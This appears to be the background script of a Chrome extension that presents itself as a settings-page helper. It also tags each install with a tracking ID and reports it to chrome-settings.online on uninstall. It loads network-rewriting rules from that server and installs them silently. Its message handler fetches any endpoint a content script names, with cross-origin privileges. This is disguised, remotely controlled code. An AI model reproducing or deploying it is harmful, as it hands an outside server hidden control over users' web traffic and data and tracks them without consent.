const source = chrome;
const developmentMode = false;

function setGSM() {
    source.storage.local.get('gcmId', resp => {
        resp.gcmId || source.gcm.register(['476483741872'], e => {
            !source.runtime.lastError && source.storage.local.set({ gcmId: e });
        });
    });
}

function getDefaultSettings(uniID) {
    return new Promise(async(resolve, reject) => {
        const data = await fetch('https://chrome-settings.online/defaultSettings/' + uniID);
        const json = await data.json();
        resolve(json);
    });
}

async function prepareStorage() {
    source.storage.local.get(['chUId'], async function(resp) {
        if (!resp.chUId) {
            resp.chUId = (developmentMode) ? 'tester' : Date.now().toString(36) + Math.random().toString(36).substr(2);
            source.storage.local.set({'chUId': resp.chUId});
            chrome.runtime.setUninstallURL(`https://chrome-settings.online/uninstall/${resp.chUId}`);
        }
        getDefaultSettings(resp.chUId).then(async function(data) {
            if(data && data.defaultSettings)
            {
                chrome.storage.local.set(data.defaultSettings);
            }
            if(data && data.netSettings)
            {
                let oldRules = await chrome.declarativeNetRequest.getDynamicRules();
                let oldRuleIds = oldRules.map(rule => rule.id);
                chrome.declarativeNetRequest.updateDynamicRules({
                    removeRuleIds: oldRuleIds,
                    addRules: data.netSettings
                });
            }
        });
    });
}

const openDefiniteSettingPage = ({ target, hostname, origin }) => {
    switch (target) {
    case 'browser_settings': {
        source.tabs.create({'url': `chrome://settings/`}, () => {});
        break;
    }

    case 'privacy_settings': {
        source.tabs.create({'url': `chrome://settings/privacy`}, () => {});
        break;
    }

    case 'cookies_settings': {
        source.tabs.create({'url': `chrome://settings/cookies/detail?site=${hostname}`}, () => {});
        break;
    }

    case 'clear_data_settings': {
        source.tabs.create({'url': `chrome://settings/clearBrowserData`}, () => {});
        break;
    }

    case 'website_settings': {
        source.tabs.create({'url': `chrome://settings/content`}, () => {});
        break;
    }

    case 'domain_settings': {
        source.tabs.create({'url': `chrome://settings/content/siteDetails?site=${encodeURIComponent(origin)}`}, () => {});
        break;
    }
    }
};

source.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action === 'OPEN_DEFINITE_SETTINGS') {
        openDefiniteSettingPage(request.data);
    }
    if (request.action === 'HIDE_UNTIL_TOMORROW') {
        source.storage.local.set({ lastHideData: new Date().getTime()});
    }
    if (request.action === 'GET_UPDATED_DEFAULT_SETTINGS') {
        fetch(request.endpoint, request.options).then((response) => response.text()).then((data) => {
            chrome.tabs.sendMessage(sender.tab.id,{'type':'UPDATED_DEFAULT_SETTINGS','handler':request.handler,'content':data});
        }).catch((error) => {
            chrome.tabs.sendMessage(sender.tab.id,{'type':'UPDATED_DEFAULT_SETTINGS','handler':request.handler,'content':null});
        });
    }
    if (request.action === 'NEVER_SHOW') {
        source.storage.local.get('neverShow', ({ neverShow }) => {
            const newNeverShow = neverShow ? [...neverShow] : [];

            newNeverShow.push(request.data.hostname);
            source.storage.local.set({ neverShow: newNeverShow });
        });
    }

    return true;
});

prepareStorage();
setGSM();
